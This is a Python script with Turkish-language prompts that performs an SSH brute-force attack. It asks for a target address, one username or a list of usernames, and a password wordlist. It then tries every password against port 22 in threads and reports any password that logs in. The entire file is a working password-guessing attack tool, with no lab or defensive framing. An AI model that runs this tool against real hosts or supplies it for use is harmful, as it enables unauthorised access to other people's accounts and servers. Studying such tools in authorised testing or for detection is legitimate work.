import paramiko
import sys
import os
import termcolor
import threading
import time
from colorama import Fore, Style
stop_flag = False
host = ""

def ssh_connect(username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = True
        print(termcolor.colored(f'[+] Şifre Bulundu: {password}, ===: {username}', 'green'))
    except paramiko.AuthenticationException:
        print(termcolor.colored(f'[-] Yanlış Giriş: {password}, Hesap: {username}', 'red'))
    except Exception as e:
        print(termcolor.colored(f'[-] Bağlantı Hatası: {str(e)}', 'red'))
    finally:
        ssh.close()

def get_user_inputs():
    while True:
        print("[1] Tek bir kullanıcı için")
        print("[2] Birden fazla kullanıcı için")
        choice = input("[+] Seçiminiz: ")
        if choice not in ['1', '2']:
            print(termcolor.colored("Lütfen 1 veya 2 girin.", 'red'))
            continue

        if choice == '1':
            username = input("[+] SSH Kullanıcı Adı: ")
            if not username:
                print(termcolor.colored("Lütfen bir kullanıcı adı girin.", 'red'))
                continue
            password_file = input("[+] Şifre Dosyası: ")
            if not os.path.exists(password_file):
                print(termcolor.colored("Dosya mevcut değil.", 'red'))
                continue
            return [(username, password_file)]
        elif choice == '2':
            user_list_file = input("[+] Kullanıcı listesi dosyasını girin: ")
            if not os.path.exists(user_list_file):
                print(termcolor.colored("Dosya mevcut değil.", 'red'))
                continue
            password_file = input("[+] Şifre Dosyası: ")
            if not os.path.exists(password_file):
                print(termcolor.colored("Dosya mevcut değil.", 'red'))
                continue
            users = []
            with open(user_list_file, 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) == 1:
                        users.append((parts[0], password_file))
            return users

def main():
    global host, stop_flag
    try:
        host = input("[+] Hedef Adres: ")
        users = get_user_inputs()
        print(f'\n* * * {host} Adresine Çoklu Kullanıcı İçin SSH Brute Force Saldırısı Başlatılıyor * * *')

        start_time = time.time()  # Zamanlayıcıyı başlat

        for username, password_file in users:
            if stop_flag:
                break
            print(f'\n[+] Kullanıcı: {username}\n')
            with open(password_file, 'r') as f:
                for password in f:
                    if stop_flag:
                        break
                    password = password.strip()
                    t = threading.Thread(target=ssh_connect, args=(username, password))
                    t.start()
                    t.join(1)  # İş parçacığı tamamlanana kadar maksimum 1 saniye bekler

        elapsed_time = time.time() - start_time  # Geçen süreyi hesapla
        if not stop_flag:
            print(termcolor.colored('[-] Şifre Bulunamadı', 'red'))
        print(termcolor.colored(f'Geçen süre: {elapsed_time:.2f} saniye', 'yellow')),

        print(Fore.BLUE + f"="*80 + Style.RESET_ALL)

    except KeyboardInterrupt:
        print(termcolor.colored("\n[!] Kullanıcı tarafından işlem iptal edildi.", "yellow"))
        sys.exit(1)

if __name__ == "__main__":
    main()
